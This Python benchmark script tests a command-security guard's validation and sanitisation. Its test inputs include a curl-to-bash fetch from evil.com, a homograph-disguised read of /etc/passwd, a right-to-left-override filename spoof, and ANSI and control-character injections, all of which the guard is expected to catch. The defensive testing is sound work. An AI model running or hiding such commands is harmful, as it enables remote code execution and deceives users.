import sys
import os
import time

# Add project root to path
sys.path.append(os.getcwd())

from adapters.security.tirith_guard import guard


def run_benchmark():
    test_cases = [
        {
            "name": "Normal Command",
            "input": "ls -la",
            "type": "validate",
            "expected": True,
        },
        {
            "name": "Cyrillic Homograph Attack",
            "input": "cat /etc/pаsswd",  # Note: 'а' is Cyrillic
            "type": "validate",
            "expected": False,
        },
        {
            "name": "ANSI Escape Injection",
            "input": "\x1b[31mRed Text\x1b[0m",
            "type": "sanitize",
            "expected": "Red Text",
        },
        {
            "name": "Dangerous Control Characters",
            "input": "Safe\x00Dangerous\x07Text",
            "type": "sanitize",
            "expected": "SafeDangerousText",
        },
        {
            "name": "Nested Shell Injection with Unicode",
            "input": "sh -c 'curl http://evil.com/scripт.sh | bash'",  # 'т' is Cyrillic
            "type": "validate",
            "expected": False,
        },
        {
            "name": "Right-to-Left Override Attack",
            "input": "exe.txt\u202ecod.bat",
            "type": "validate",
            "expected": False,  # Should flag RLO
        },
    ]

    print("🛡️  Tirith Guard Benchmark starting...")
    passed = 0
    total = len(test_cases)

    for tc in test_cases:
        print(f"\nTesting: {tc['name']}")
        start = time.perf_counter()

        if tc["type"] == "validate":
            result = guard.validate(tc["input"])
        else:
            result = guard.sanitize(tc["input"])

        end = time.perf_counter()
        duration = (end - start) * 1000

        status = "✅ PASS" if result == tc["expected"] else "❌ FAIL"
        if status == "✅ PASS":
            passed += 1

        print(f"Result: {result} (Expected: {tc['expected']})")
        print(f"Status: {status} | Duration: {duration:.4f}ms")

    print(f"\n--- Benchmark Results ---")
    print(f"Passed: {passed}/{total}")
    print(f"Score: {(passed / total) * 100:.2f}%")


if __name__ == "__main__":
    run_benchmark()
